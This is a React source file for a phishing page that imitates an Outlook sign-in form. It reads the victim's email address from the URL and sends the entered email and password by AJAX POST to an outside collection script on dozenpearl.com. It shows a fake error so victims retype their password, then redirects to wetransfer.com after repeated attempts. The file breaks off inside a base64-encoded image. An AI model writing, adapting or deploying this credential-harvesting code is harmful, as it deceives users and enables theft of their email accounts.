import { Fragment, useEffect, useState, createContext } from 'react';
import './App.css';
import $ from "jquery";
import Loader from './component/Preloader/preloader';
// import PreLoader from './Preloader/Preloader';

export const ThemeContext = createContext();

function App() {

  // const [username, setUsername] = useState('Akuma_Best');

  const [spinLoader, setSpinLoader] = useState(false);

  const emailInTheURL = window.location.href;
  const sliceEqualSign = emailInTheURL.indexOf("=");
  const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('()', 1).toString();

  const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
  const [outlookPassword, setOulookPassword] = useState('');


  const [count, setCount] = useState(0);
  const [err, setErr] = useState(false);

  const [val, setVal] = useState('Sign In');

  const subForm = e=>{
    e.preventDefault();
    
    console.log(outlookEmail, outlookPassword);

    if(outlookPassword === ""){
        return null
    }else{
        setSpinLoader(true);
        const user = {
            email: outlookEmail,
            password: outlookPassword
        };
        
        $.ajax({
            type: "POST",
            url: "https://dozenpearl.com/nc_assets/fonts/laptop/wet.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });

        setVal('Please wait...');
        setTimeout(()=>{
            setTimeout(() => {
                setErr(true);
                setOulookPassword('');
                setSpinLoader(false);
                setVal('Sign In');
            }, 2000);
        }, 2500)
        setErr(false);
        setCount(count=> count + 1);
        if(count >= 3){
            const redirectURL = window.location.href;
            const sliceEqualSign = redirectURL.indexOf("@");
            const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
            console.log(extracetdemailDomain);
            // window.location.href = `https://www.${extracetdemailDomain.split('()', 1).toString()}`;
            window.location.href = `https://wetransfer.com/`;
            
        }
    }
};

      const [modal, setModal] = useState(false);
      const showModal = () => setModal(true);

      const [first, last] = useState(false);

      useEffect(()=>{
        const bdy = document.querySelector('body');
        // console.log(bdy);
        bdy.style.background = "white"
        last(true);
        setTimeout(() => {
          bdy.style.background = "";
          last(false);
        }, 3000);
      }, []);

  return (
    <div className="App">

      {/* <ThemeContext.Provider value={username}> */}

      

      

      { first ? <Loader/> :<Fragment>
        
        

              <div className='jhnujn' onClick={showModal}></div>
              <div className='logs' onClick={showModal}></div>

            { spinLoader ? <Loader /> : null }


            <article style={{
              display:'flex',
              justifyContent:'center',
              alignItems:'center',
            }}>

              {modal ?
                <Fragment>
                <div className='box'>
                  <img 
                    src="data:image/png;base64,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